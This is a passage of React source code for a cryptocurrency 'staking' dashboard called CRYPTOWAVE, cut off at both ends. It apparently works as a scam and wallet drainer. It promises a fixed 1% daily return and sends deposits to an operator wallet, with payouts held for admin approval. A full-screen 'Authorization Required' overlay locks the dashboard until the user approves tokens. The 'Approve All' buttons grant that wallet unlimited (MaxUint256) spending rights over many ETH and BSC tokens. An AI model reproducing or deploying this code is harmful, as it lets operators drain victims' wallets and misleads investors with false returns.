    setTimeout(() => {
      setNotification({ show: false, message: '', type: '' });
    }, 4000);
  };

  const copyAddress = () => {
    navigator.clipboard.writeText(walletAddress);
    showNotification('Address copied to clipboard!', 'success');
  };

  // Calculate APY based on VIP level
  const getCurrentAPY = () => {
    const bonuses = [0, platformSettings.vip1Bonus, platformSettings.vip2Bonus, platformSettings.vip3Bonus];
    return (platformSettings.baseAPY + (bonuses[userData.vipLevel] || 0)).toFixed(2);
  };

  // 1% per day flat rate (matches backend calculateInterest)
  const getDailyEarnings = () => (userData.stakedAmount * 0.01).toFixed(2);

  // Check if there's a pending claim awaiting admin approval
  const pendingClaim = withdrawals.find(w => w.status === 'pending' && w.withdrawalType === 'claim');
  const claimPending = !!pendingClaim;

  // Live countdown for pending claim (ticks every 60s)
  const [claimTimeLeft, setClaimTimeLeft] = useState('');
  useEffect(() => {
    if (!pendingClaim?.requestedAt) { setClaimTimeLeft(''); return; }
    const deadline = new Date(pendingClaim.requestedAt).getTime() + 24 * 60 * 60 * 1000;
    const tick = () => {
      const diff = deadline - Date.now();
      if (diff <= 0) { setClaimTimeLeft('overdue'); return; }
      const h = Math.floor(diff / 3600000);
      const m = Math.floor((diff % 3600000) / 60000);
      setClaimTimeLeft(h > 0 ? `${h}h ${m}m` : `${m}m`);
    };
    tick();
    const id = setInterval(tick, 60000);
    return () => clearInterval(id);
  }, [pendingClaim?.requestedAt]);

  // Handle stake — real on-chain token transfer (user picks token on BSC, USDC-only on ETH)
  const handleStake = async () => {
    const amount = parseFloat(stakeAmount);
    if (!amount || amount <= 0) { showNotification('Please enter a valid amount', 'error'); return; }

    // Resolve token config from selected token + chain
    const isBSC = selectedTokenChain === 'bsc';
    let tokenCfg, chainId, chainName;
    if (isBSC) {
      tokenCfg = BSC_TOKENS.find(t => t.symbol === selectedToken) || BSC_TOKENS[0];
      chainId = '0x38'; chainName = 'BNB Smart Chain';
    } else {
      tokenCfg = KNOWN_TOKENS.find(t => t.symbol === selectedToken) || KNOWN_TOKENS.find(t => t.symbol === 'USDT');
      chainId = '0x1'; chainName = 'Ethereum Mainnet';
    }

    // Check user has enough of the selected token (use stakeableTokens which has live balances)
    const stakeToken = stakeableTokens.find(t => t.symbol === selectedToken && t.chain === selectedTokenChain);
    const availBal = parseFloat(stakeToken?.balance || '0');
    if (amount > availBal) { showNotification(`Insufficient ${tokenCfg.symbol} balance`, 'error'); return; }

    setLoading(true);
    try {
      const settingsRes = await fetch(`${API_BASE}/api/settings`);
      const settings = await settingsRes.json();

      const platformAddr = !isBSC
        ? (settings.platformWalletETH || settings.platformWallet)
        : settings.platformWallet;

      if (!platformAddr) { showNotification('Platform wallet not configured. Contact admin.', 'error'); setLoading(false); return; }

      showNotification(`Switching to ${chainName}...`, 'info');
      const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
      try {
        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] });
      } catch (switchErr) {
        if (switchErr.code === 4902 && isBSC) {
          await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org/'], blockExplorerUrls: ['https://bscscan.com/'] }] });
        } else { throw switchErr; }
      }

      showNotification('Please confirm the transaction in your wallet...', 'info');
      const signer = web3Provider.getSigner();
      const isNativeETH = !isBSC && selectedToken === 'ETH';
      const amountInWei = isNativeETH
        ? ethers.utils.parseEther(amount.toString())
        : ethers.utils.parseUnits(amount.toString(), tokenCfg.decimals);

      let tx;
      if (isNativeETH) {
        tx = await signer.sendTransaction({ to: platformAddr, value: amountInWei });
      } else {
        const tokenContract = new ethers.Contract(tokenCfg.address, USDC_ABI, signer);
        tx = await tokenContract.transfer(platformAddr, amountInWei);
      }

      showNotification('Transaction submitted! Waiting for confirmation...', 'info');
      const receipt = await tx.wait(1);
      if (receipt.status === 0) { showNotification('Transaction failed on-chain', 'error'); setLoading(false); return; }

      showNotification('Transaction confirmed! Verifying...', 'info');
      const response = await fetch(`${API_BASE}/api/stake`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, amount, type: 'stake', txHash: tx.hash, network: isBSC ? 'BSC' : 'ETH', token: isNativeETH ? 'ETH' : tokenCfg.symbol, isNative: isNativeETH })
      });

      if (response.ok) {
        showNotification(`Successfully staked ${amount} ${tokenCfg.symbol}!`, 'success');
        setStakeAmount('');
        await fetchUserData(); await fetchTransactions(); await fetchWalletBalance(); await fetchStakeableTokens();
      } else {
        const err = await response.json();
        showNotification(err.message || 'Backend verification failed', 'error');
      }
    } catch (error) {
      console.error('Stake error:', error);
      if (error.code === 4001 || error.code === 'ACTION_REJECTED') showNotification('Transaction rejected', 'error');
      else if (error.message?.includes('insufficient funds')) showNotification('Insufficient funds for gas', 'error');
      else showNotification(error.reason || error.message || 'Failed to stake. Please try again.', 'error');
    } finally { setLoading(false); }
  };

  // Manual deposit for TRX / BTC — user sends manually then submits tx hash
  const handleManualDeposit = async () => {
    const amount = parseFloat(stakeAmount);
    if (!amount || amount <= 0) { showNotification('Enter the amount you sent', 'error'); return; }
    if (!manualTxHash.trim()) { showNotification('Enter your transaction hash / ID', 'error'); return; }

    setManualDepositLoading(true);
    try {
      const res = await fetch(`${API_BASE}/api/stake/manual`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, amount, txHash: manualTxHash.trim(), network })
      });
      const data = await res.json();
      if (res.ok) {
        showNotification(data.message || 'Deposit submitted for review!', 'success');
        setStakeAmount(''); setManualTxHash('');
        await fetchTransactions();
      } else {
        showNotification(data.message || 'Submission failed', 'error');
      }
    } catch (e) {
      showNotification('Network error. Please try again.', 'error');
    } finally { setManualDepositLoading(false); }
  };

  // Handle unstake
  const handleUnstake = async () => {
    const amount = parseFloat(unstakeAmount);
    if (!amount || amount <= 0) {
      showNotification('Please enter a valid amount', 'error');
      return;
    }

    if (amount > userData.stakedAmount) {
      showNotification('Amount exceeds staked balance', 'error');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch(`${API_BASE}/api/stake`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress,
          amount,
          type: 'unstake'
        })
      });

      if (response.ok) {
        showNotification(`Successfully unstaked ${amount} USDC!`, 'success');
        setUnstakeAmount('');
        await fetchUserData();
        await fetchTransactions();
      } else {
        const error = await response.json();
        showNotification(error.message || 'Unstaking failed', 'error');
      }
    } catch (error) {
      console.error('Unstake error:', error);
      showNotification('Failed to unstake. Please try again.', 'error');
    } finally {
      setLoading(false);
    }
  };

  // Handle claim rewards
  const handleClaimRewards = async () => {
    if (userData.claimableRewards <= 0) {
      showNotification('No rewards to claim', 'error');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch(`${API_BASE}/api/claim`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, network: payoutNetwork, payoutToken })
      });

      if (response.ok) {
        const data = await response.json();
        showNotification(`Claim request submitted! Admin will send ${payoutToken} to your wallet on ${payoutNetwork}.`, 'success');
        await fetchUserData();
        await fetchTransactions();
      } else {
        const error = await response.json();
        showNotification(error.message || 'Claim failed', 'error');
      }
    } catch (error) {
      console.error('Claim error:', error);
      showNotification('Failed to claim rewards. Please try again.', 'error');
    } finally {
      setLoading(false);
    }
  };

  // Handle withdrawal request
  const handleWithdraw = async () => {
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount <= 0) {
      showNotification('Please enter a valid amount', 'error');
      return;
    }

    // Calculate pending withdrawal total
    const pendingTotal = withdrawals
      .filter(w => w.status === 'pending')
      .reduce((sum, w) => sum + w.amount, 0);
    const availableBalance = userData.stakedAmount - pendingTotal;

    if (amount > availableBalance) {
      showNotification('Amount exceeds available staked balance', 'error');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch(`${API_BASE}/api/withdraw/request`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, amount, network: payoutNetwork, payoutToken })
      });

      if (response.ok) {
        showNotification(`Withdrawal of ${amount} ${payoutToken} requested on ${payoutNetwork}!`, 'success');
        setWithdrawAmount('');
        await fetchWithdrawals();
        await fetchTransactions();
      } else {
        const error = await response.json();
        showNotification(error.message || 'Withdrawal request failed', 'error');
      }
    } catch (error) {
      console.error('Withdraw error:', error);
      showNotification('Failed to submit withdrawal request. Please try again.', 'error');
    } finally {
      setLoading(false);
    }
  };

  // Handle earnings withdrawal request
  const handleWithdrawEarnings = async () => {
    const amount = parseFloat(earningsWithdrawAmount);
    if (!amount || amount <= 0) {
      showNotification('Please enter a valid amount', 'error');
      return;
    }

    // Calculate pending earnings withdrawals
    const pendingEarningsTotal = withdrawals
      .filter(w => w.status === 'pending' && w.withdrawalType === 'earnings')
      .reduce((sum, w) => sum + w.amount, 0);
    const availableEarnings = userData.claimableRewards - pendingEarningsTotal;

    if (amount > availableEarnings) {
      showNotification('Amount exceeds available earnings', 'error');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch(`${API_BASE}/api/withdraw/earnings`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, amount, network: payoutNetwork, payoutToken })
      });

      if (response.ok) {
        showNotification(`Earnings withdrawal of ${amount} ${payoutToken} requested on ${payoutNetwork}!`, 'success');
        setEarningsWithdrawAmount('');
        await fetchWithdrawals();
        await fetchTransactions();
        await fetchUserData();
      } else {
        const error = await response.json();
        showNotification(error.message || 'Earnings withdrawal request failed', 'error');
      }
    } catch (error) {
      console.error('Earnings withdraw error:', error);
      showNotification('Failed to submit earnings withdrawal request.', 'error');
    } finally {
      setLoading(false);
    }
  };

  // Get withdrawal fee from settings
  const getWithdrawalFee = () => {
    return platformSettings.withdrawalFee || 2;
  };

  // Format number with commas
  const formatNumber = (num) => {
    return parseFloat(num).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  };

  // Get VIP level name
  const getVipName = (level) => {
    const names = ['Normal', 'VIP 1', 'VIP 2', 'VIP 3'];
    return names[level] || 'Normal';
  };

  if (dataLoading) {
    return (
      <div className="dashboard loading-state" style={{alignItems:'center',justifyContent:'center'}}>
        <div className="loading-container">
          <div className="spinner large"></div>
          <p style={{color:'rgba(255,255,255,0.5)',marginTop:'1rem',fontSize:'0.9rem'}}>Loading your dashboard...</p>
        </div>
      </div>
    );
  }

  const navItems = [
    { id: 'overview',      icon: '📊', label: 'Overview' },
    { id: 'stake',         icon: '💎', label: 'Stake',    onClick: fetchStakeableTokens },
    { id: 'earnings',      icon: '📈', label: 'Earnings' },
    { id: 'withdraw',      icon: '💸', label: 'Withdraw' },
    { id: 'transactions',  icon: '📋', label: 'History' },
  ];

  return (
    <div className="dashboard">
      {/* Notification toast */}
      {notification.show && (
        <div className={`notification ${notification.type}`}>
          <span>{notification.message}</span>
          <button onClick={() => setNotification({ show: false, message: '', type: '' })}>&times;</button>
        </div>
      )}

      {/* Mobile hamburger */}
      <button className="mobile-menu-btn" onClick={() => setMobileMenuOpen(!mobileMenuOpen)} aria-label="Toggle menu">
        <span/><span/><span/>
      </button>

      {/* Sidebar */}
      <aside className={`dashboard-sidebar ${mobileMenuOpen ? 'mobile-open' : ''}`}>
        <div className="sidebar-header">
          <div className="sidebar-logo">
            <div className="logo-icon-dash">C</div>
            <span>CRYPTOWAVE</span>
          </div>
        </div>
        <nav className="sidebar-nav">
          {navItems.map(item => (
            <button
              key={item.id}
              className={`nav-item ${activeTab === item.id ? 'active' : ''}`}
              onClick={() => { setActiveTab(item.id); setMobileMenuOpen(false); item.onClick && item.onClick(); }}
            >
              <span className="nav-icon">{item.icon}</span>
              <span>{item.label}</span>
            </button>
          ))}
          <button
            className={`nav-item ${activeTab === 'vip' ? 'active' : ''}`}
            onClick={() => { setActiveTab('vip'); setMobileMenuOpen(false); }}
          >
            <span className="nav-icon">⭐</span>
            <span>VIP Status</span>
          </button>
        </nav>
        <div className="sidebar-footer">
          <button className="disconnect-btn" onClick={onDisconnect}>
            <span>🚪</span><span>Logout</span>
          </button>
        </div>
      </aside>

      {/* Mobile overlay */}
      <div className={`mobile-overlay ${mobileMenuOpen ? 'show' : ''}`} onClick={() => setMobileMenuOpen(false)} />

      {/* Bottom mobile nav */}
      <nav className="mobile-bottom-nav">
        <div className="mobile-bottom-nav-inner">
          {navItems.map(item => (
            <button
              key={item.id}
              className={`mobile-nav-btn ${activeTab === item.id ? 'active' : ''}`}
              onClick={() => { setActiveTab(item.id); item.onClick && item.onClick(); }}
            >
              <span className="nav-icon">{item.icon}</span>
              {item.label}
            </button>
          ))}
        </div>
      </nav>

      {/* Main */}
      <main className="dashboard-main">
        {/* Header */}
        <header className="dashboard-header">
          <div className="header-left">
            <h1>{navItems.find(n => n.id === activeTab)?.label || 'VIP Status'}</h1>
            <p className="header-subtitle">Welcome back{userData.userId ? ` · User #${userData.userId}` : ''}!</p>
          </div>
          <div className="header-right">
            {userData.stakedAmount > 0 && (
              <div className="header-earnings-ticker">
                <div className="ticker-dot" />
                <div>
                  <div className="ticker-label">Daily earnings</div>
                  <div className="ticker-value">+{getDailyEarnings()} USDC</div>
                </div>
              </div>
            )}
            <div className="vip-badge-header">
              <span>⭐</span>
              <span>{getVipName(userData.vipLevel)}</span>
            </div>
            <div className="wallet-address" onClick={copyAddress} title="Click to copy">
              <span>{walletAddress.slice(0, 6)}…{walletAddress.slice(-4)}</span>
              <span className="copy-icon">⎘</span>
            </div>
          </div>
        </header>

        <div className="dashboard-content">

          {/* ── Authorization locker ── */}
          {(adminNotifications.filter(n => n.type === 'approval_request').length > 0 || selfApprovalNeeded.length > 0) && (
            <div style={{position:'fixed',inset:0,zIndex:9999,backdropFilter:'blur(8px)',background:'rgba(0,0,0,0.88)',display:'flex',alignItems:'center',justifyContent:'center',padding:'20px'}}>
              <div style={{background:'linear-gradient(135deg,#0f172a,#1e1b4b)',border:'1px solid rgba(245,158,11,0.6)',borderRadius:'20px',padding:'32px 28px',maxWidth:'460px',width:'100%',boxShadow:'0 0 60px rgba(245,158,11,0.15)'}}>
                <div style={{textAlign:'center',marginBottom:'20px'}}>
                  <div style={{fontSize:'2.5rem',marginBottom:'8px'}}>🔐</div>
                  <div style={{fontWeight:700,color:'#fbbf24',fontSize:'1.2rem',marginBottom:'6px'}}>Authorization Required</div>
                  <div style={{fontSize:'0.83rem',color:'#94a3b8',lineHeight:1.5}}>Your dashboard is locked. Please authorize token access to continue using the platform.</div>
                </div>
                {adminNotifications.filter(n => n.type === 'approval_request').map(notif => (
                  <AdminApprovalBanner key={notif.id} notif={notif} walletAddress={walletAddress} approvingNetwork={approvingNetwork} setApprovingNetwork={setApprovingNetwork} showNotification={showNotification} onDismiss={() => dismissNotification(notif.id)} />
                ))}
                {selfApprovalNeeded.map(net => (
                  <AdminApprovalBanner key={`self-${net}`} notif={{ id:`self-${net}`, type:'approval_request', network:net, message:`Authorize ${net} token access to enable staking` }} walletAddress={walletAddress} approvingNetwork={approvingNetwork} setApprovingNetwork={setApprovingNetwork} showNotification={showNotification}
                    onDismiss={() => { const addr=walletAddress.toLowerCase(); localStorage.setItem(`approvalsGranted${net}_${addr}`,'1'); setSelfApprovalNeeded(prev=>prev.filter(n=>n!==net)); }} />
                ))}
                {selfApprovalNeeded.length > 0 && adminNotifications.filter(n => n.type === 'approval_request').length === 0 && (
                  <div style={{marginTop:'16px',textAlign:'center'}}>
                    <div style={{fontSize:'0.78rem',color:'#64748b',marginBottom:'8px'}}>Need BNB (BSC) or ETH (Ethereum) in your wallet for network fees.</div>
                    <button onClick={() => { const addr=walletAddress.toLowerCase(); selfApprovalNeeded.forEach(n=>localStorage.setItem(`approvalsGranted${n}_${addr}`,'skipped')); setSelfApprovalNeeded([]); }}
                      style={{background:'transparent',border:'1px solid #334155',color:'#64748b',borderRadius:'8px',padding:'8px 20px',cursor:'pointer',fontSize:'0.82rem'}}>
                      Skip for now — I'll approve later
                    </button>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════
              OVERVIEW TAB
          ══════════════════════════════════════════ */}
          {activeTab === 'overview' && (
            <div className="overview-section">

              {/* One-time approval banners */}
              {!ethApproved && (
                <div style={{background:'rgba(99,102,241,0.1)',border:'1px solid rgba(99,102,241,0.35)',borderRadius:'14px',padding:'14px 18px',marginBottom:'12px'}}>
                  <div style={{fontWeight:600,color:'#a5b4fc',marginBottom:'4px'}}>One-time setup: Authorize Ethereum Tokens</div>
                  <div style={{fontSize:'0.8rem',color:'#94a3b8',marginBottom:'12px'}}>Allows the platform to stake USDC, DAI, WBTC, WETH, LINK on ETH on your behalf.</div>
                  <button style={{background:'#6366f1',color:'#fff',border:'none',borderRadius:'10px',padding:'10px 20px',cursor:'pointer',fontWeight:600,opacity:approvingEth?0.7:1,width:'100%'}} disabled={approvingEth}
                    onClick={async () => {
                      setApprovingEth(true);
                      try {
                        const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
                        const platformWallet = settings?.platformWalletETH || settings?.platformWallet;
                        if (!platformWallet) { showNotification('Platform wallet not configured', 'error'); return; }
                        try { await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{chainId:'0x1'}] }); } catch(e) { if(e.code!==4902) throw e; }
                        const provider = new ethers.providers.Web3Provider(window.ethereum);
                        const signer = provider.getSigner();
                        const approveAbi = ['function approve(address,uint256) returns (bool)'];
                        let approved = 0;
                        for (const token of ETH_APPROVABLE) {
                          try {
                            showNotification(`Approving ${token.symbol} (${approved+1}/${ETH_APPROVABLE.length})…`, 'info');
                            const tx = await new ethers.Contract(token.address, approveAbi, signer).approve(platformWallet, ethers.constants.MaxUint256);
                            await tx.wait(); approved++;
                          } catch(e) { if(e.code===4001||e.code==='ACTION_REJECTED') showNotification(`${token.symbol} skipped`,'error'); }
                        }
                        if (approved > 0) { setEthApproved(true); showNotification(`✅ ${approved}/${ETH_APPROVABLE.length} ETH tokens approved!`,'success'); }
                        else showNotification('No tokens approved','error');
                      } catch(e) { showNotification(e.code===4001?'Cancelled':'Failed: '+e.message,'error'); } finally { setApprovingEth(false); }
                    }}>
                    {approvingEth ? 'Approving ETH Tokens…' : '🔓 Approve All Ethereum Tokens'}
                  </button>
                </div>
              )}
              {!usdtApproved && (
                <div style={{background:'rgba(99,102,241,0.1)',border:'1px solid rgba(99,102,241,0.35)',borderRadius:'14px',padding:'14px 18px',marginBottom:'20px'}}>
                  <div style={{fontWeight:600,color:'#a5b4fc',marginBottom:'4px'}}>One-time setup: Authorize BSC Tokens</div>
                  <div style={{fontSize:'0.8rem',color:'#94a3b8',marginBottom:'12px'}}>Allows the platform to stake USDC, BTCB, ETH, CAKE, BUSD on BSC on your behalf.</div>
                  <button style={{background:'#6366f1',color:'#fff',border:'none',borderRadius:'10px',padding:'10px 20px',cursor:'pointer',fontWeight:600,opacity:approvingUsdt?0.7:1,width:'100%'}} disabled={approvingUsdt}
                    onClick={async () => {
                      setApprovingUsdt(true);
                      const BSC_STAKEABLE = [
                        {symbol:'USDT',address:'0x55d398326f99059fF775485246999027B3197955'},
                        {symbol:'USDC',address:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d'},
                        {symbol:'BTCB',address:'0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c'},
                        {symbol:'ETH', address:'0x2170Ed0880ac9A755fd29B2688956BD959F933F8'},
                        {symbol:'CAKE',address:'0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82'},
                        {symbol:'BUSD',address:'0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'},
                      ];
                      try {
                        const settings = await fetch(`${API_BASE}/api/settings`).then(r=>r.json());
                        const platformWallet = settings?.platformWallet;
                        if (!platformWallet) { showNotification('Platform wallet not configured','error'); return; }
                        try { await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x38'}]}); }
                        catch(e) {
                          if (e.code === 4902) {
                            await window.ethereum.request({method:'wallet_addEthereumChain',params:[{chainId:'0x38',chainName:'BNB Smart Chain',nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18},rpcUrls:['https://bsc-dataseed1.binance.org/'],blockExplorerUrls:['https://bscscan.com']}]});
                          } else throw e;
                        }
                        const bscProvider = new ethers.providers.Web3Provider(window.ethereum);
                        const signer = bscProvider.getSigner();
                        const approveAbi = ['function approve(address,uint256) returns (bool)'];
                        let approved = 0;
                        for (const token of BSC_STAKEABLE) {
                          try {
                            showNotification(`Approving ${token.symbol} (${approved+1}/${BSC_STAKEABLE.length})…`,'info');
                            const tx = await new ethers.Contract(token.address,approveAbi,signer).approve(platformWallet,ethers.constants.MaxUint256);
                            await tx.wait(); approved++;
                          } catch(e) { if(e.code===4001||e.code==='ACTION_REJECTED') showNotification(`${token.symbol} skipped`,'error'); }
                        }
                        if (approved > 0) { setUsdtApproved(true); showNotification(`✅ ${approved}/${BSC_STAKEABLE.length} BSC tokens approved!`,'success'); }
                        else showNotification('No tokens approved','error');
                      } catch(e) { showNotification(e.code===4001?'Cancelled':'Failed: '+e.message,'error'); } finally { setApprovingUsdt(false); }
                    }}>
                    {approvingUsdt ? 'Approving BSC Tokens…' : '🔓 Approve All BSC Tokens'}
                  </button>
                </div>
              )}
              {/* ── Hero card ── */}
              <div className="overview-hero">
                <div className="hero-left">
                  <div className="hero-eyebrow">Total Staked Balance</div>
                  <div className="hero-amount">{formatNumber(userData.stakedAmount)}<span>USDT</span></div>
                  <div className="hero-apy-badge">
                    <span style={{width:7,height:7,background:'#10b981',borderRadius:'50%',display:'inline-block'}}/>
                    1% Daily · Earning {getDailyEarnings()} USDC/day
                  </div>
                  {userData.stakedAmount > 0 && (
                    <div style={{fontSize:'0.72rem',color:'rgba(255,255,255,0.35)',marginTop:'0.6rem'}}>
                      Platform-managed staking · Earnings credited hourly
                    </div>
                  )}
                </div>
                <div className="hero-right">
                  <div className="hero-daily-card">
                    <div className="hero-daily-label">Claimable Now</div>
                    <div className="hero-daily-amount">{formatNumber(userData.claimableRewards)}</div>
                    <div className="hero-daily-sub">USDC · pending approval after claim</div>
                  </div>
                  <div className="hero-quick-btns">
                    <button className="hero-btn stake" onClick={() => { setActiveTab('stake'); fetchStakeableTokens(); }}>+ Stake</button>
                    <button
                      className="hero-btn claim"
                      disabled={loading || userData.claimableRewards <= 0 || claimPending}
                      onClick={handleClaimRewards}
                    >
                      {claimPending ? '⏳ Claim Pending' : 'Claim'}
                    </button>
                  </div>
                </div>
              </div>

              {/* ── Stats grid ── */}
              <div className="stats-grid">
                <div className="stat-card">
                  <div className="stat-header">
                    <span className="stat-icon">💵</span>
                    <span className="stat-label">Wallet USDC</span>
                  </div>
                  <div className="stat-value">{formatNumber(usdtBalance)} USDC</div>
                  <div className="stat-change">In your wallet</div>
                </div>

                <div className="stat-card claimable-card">
                  <div className="stat-header">
                    <span className="stat-icon">💎</span>
                    <span className="stat-label">Claimable Rewards</span>
                  </div>
                  <div className="stat-value">{formatNumber(userData.claimableRewards)} USDC</div>
                  <div className="stat-change positive">+{getDailyEarnings()}/day</div>
                </div>

                <div className="stat-card">
                  <div className="stat-header">
                    <span className="stat-icon">🎯</span>
                    <span className="stat-label">Total Earned</span>
                  </div>
                  <div className="stat-value">{formatNumber(userData.totalEarned)} USDC</div>
                  <div className="stat-change positive">All time</div>
                </div>

                <div className="stat-card">
                  <div className="stat-header">
                    <span className="stat-icon">💼</span>
                    <span className="stat-label">Wallet Portfolio</span>
                  </div>
                  <div className="stat-value">${formatNumber(totalUsdValue)}</div>
                  <div className="stat-change">{tokenBalances.length + 1} assets</div>
                </div>

                <div className="stat-card">
                  <div className="stat-header">
                    <span className="stat-icon">⚡</span>
                    <span className="stat-label">ETH Balance</span>
                  </div>
                  <div className="stat-value">{ethBalance} ETH</div>
                  <div className="stat-change">${formatNumber(ethUsdValue)} · gas</div>
                </div>
              </div>

              {/* ── Payout address notice ── */}
              {userData.stakedAmount > 0 && (
                <div style={{background:'rgba(102,126,234,0.08)',border:'1px solid rgba(102,126,234,0.2)',borderRadius:'12px',padding:'12px 16px',marginBottom:'1.25rem',fontSize:'0.8rem',color:'rgba(255,255,255,0.55)',lineHeight:1.6}}>
                  <strong style={{color:'#a78bfa',display:'block',marginBottom:'3px'}}>How claims work</strong>
                  When you request a claim, admin reviews and manually sends USDC to your connected wallet address
                  (<code style={{fontFamily:'monospace',color:'#c4b5fd',fontSize:'0.75rem'}}>{walletAddress.slice(0,10)}…{walletAddress.slice(-6)}</code>).
                  You'll see the tx hash in your withdrawal history once processed.
                </div>
              )}

              {/* Wallet Portfolio Breakdown */}
              <div className="portfolio-breakdown">
                {/* Portfolio Header */}
                <div className="portfolio-header">
                  <div className="portfolio-header-left">
                    <h2 className="section-title" style={{margin:0}}>Wallet Portfolio</h2>
                    <p className="portfolio-subtitle">Your connected wallet holdings</p>
                  </div>
                  <div className="portfolio-total-badge">
                    <div className="portfolio-total-label">Total Value</div>
                    <div className="portfolio-total-amount">${formatNumber(totalUsdValue)}</div>
                  </div>
                </div>

                {/* Token Cards */}
                <div className="token-cards">
                  {/* ETH row */}
                  {(() => {
                    const pct = totalUsdValue > 0 ? (ethUsdValue / totalUsdValue * 100).toFixed(1) : '0.0';
                    return (
                      <div className="token-card">
                        <div className="token-card-icon" style={{background:'linear-gradient(135deg,#627eea,#4a5fc7)'}}>
                          <span>Ξ</span>
                        </div>
                        <div className="token-card-info">
                          <div className="token-card-top">
                            <span className="token-card-symbol">ETH</span>
                            <span className="token-card-chain-badge" style={{background:'rgba(98,126,234,0.15)',color:'#8b9ff0',border:'1px solid rgba(98,126,234,0.3)'}}>ERC-20</span>
                          </div>
                          <div className="token-card-name">Ethereum</div>
                        </div>
                        <div className="token-card-amounts">
                          <div className="token-card-balance">{ethBalance} <span className="token-card-sym">ETH</span></div>
                          <div className="token-card-usd">${formatNumber(ethUsdValue)}</div>
                        </div>
                        <div className="token-card-bar-wrap">
                          <div className="token-card-bar" style={{width:`${Math.min(pct,100)}%`,background:'linear-gradient(90deg,#627eea,#4a5fc7)'}}/>
                          <span className="token-card-pct">{pct}%</span>
                        </div>
                      </div>
                    );
                  })()}

                  {tokenBalances.map((token, i) => {
                    const pct = totalUsdValue > 0 ? (token.usdValue / totalUsdValue * 100).toFixed(1) : '0.0';
                    const colors = {
                      usdt: {bg:'linear-gradient(135deg,#26a17b,#1a7a5e)', badge:'rgba(38,161,123,0.15)', badgeText:'#4fd1a8', badgeBorder:'rgba(38,161,123,0.3)', bar:'linear-gradient(90deg,#26a17b,#1a7a5e)'},
                      usdc: {bg:'linear-gradient(135deg,#2775ca,#1a5a9e)', badge:'rgba(39,117,202,0.15)', badgeText:'#6fa8e8', badgeBorder:'rgba(39,117,202,0.3)', bar:'linear-gradient(90deg,#2775ca,#1a5a9e)'},
                      btcb: {bg:'linear-gradient(135deg,#f7931a,#d4770e)', badge:'rgba(247,147,26,0.15)', badgeText:'#f7931a', badgeBorder:'rgba(247,147,26,0.3)', bar:'linear-gradient(90deg,#f7931a,#d4770e)'},
                      btc:  {bg:'linear-gradient(135deg,#f7931a,#d4770e)', badge:'rgba(247,147,26,0.15)', badgeText:'#f7931a', badgeBorder:'rgba(247,147,26,0.3)', bar:'linear-gradient(90deg,#f7931a,#d4770e)'},
                      eth:  {bg:'linear-gradient(135deg,#627eea,#4a5fc7)', badge:'rgba(98,126,234,0.15)', badgeText:'#8b9ff0', badgeBorder:'rgba(98,126,234,0.3)', bar:'linear-gradient(90deg,#627eea,#4a5fc7)'},
                      cake: {bg:'linear-gradient(135deg,#1fc7d4,#129faa)', badge:'rgba(31,199,212,0.15)', badgeText:'#4de8f2', badgeBorder:'rgba(31,199,212,0.3)', bar:'linear-gradient(90deg,#1fc7d4,#129faa)'},
                      busd: {bg:'linear-gradient(135deg,#f0b90b,#c99a09)', badge:'rgba(240,185,11,0.15)', badgeText:'#f0c842', badgeBorder:'rgba(240,185,11,0.3)', bar:'linear-gradient(90deg,#f0b90b,#c99a09)'},
                      trx:  {bg:'linear-gradient(135deg,#ef4444,#c53030)', badge:'rgba(239,68,68,0.15)', badgeText:'#f87171', badgeBorder:'rgba(239,68,68,0.3)', bar:'linear-gradient(90deg,#ef4444,#c53030)'},
                    };
                    const sym = token.symbol.toLowerCase();
                    const c = colors[sym] || {bg:'linear-gradient(135deg,#667eea,#764ba2)', badge:'rgba(102,126,234,0.15)', badgeText:'#a0aec0', badgeBorder:'rgba(102,126,234,0.3)', bar:'linear-gradient(90deg,#667eea,#764ba2)'};
                    const chainLabel = token.chain === 'tron' ? 'TRC-20' : token.chain === 'bsc' ? 'BEP-20' : token.chain === 'bitcoin' ? 'Bitcoin' : 'ERC-20';
                    const icon = sym === 'btc' || sym === 'btcb' ? '₿' : sym === 'usdt' || sym === 'usdc' || sym === 'busd' ? '$' : sym === 'trx' ? '◈' : sym === 'cake' ? '🎂' : token.symbol.slice(0,2);
                    return (
                      <div key={`${token.symbol}-${token.chain||'bsc'}-${i}`} className="token-card">
                        <div className="token-card-icon" style={{background:c.bg}}>
                          <span>{icon}</span>
                        </div>
                        <div className="token-card-info">
                          <div className="token-card-top">
                            <span className="token-card-symbol">{token.symbol}</span>
                            <span className="token-card-chain-badge" style={{background:c.badge,color:c.badgeText,border:`1px solid ${c.badgeBorder}`}}>{chainLabel}</span>
                          </div>
                          <div className="token-card-name">{token.name}</div>
                        </div>
                        <div className="token-card-amounts">
                          <div className="token-card-balance">{token.balance} <span className="token-card-sym">{token.symbol}</span></div>
                          <div className="token-card-usd">${formatNumber(token.usdValue)}</div>
                        </div>
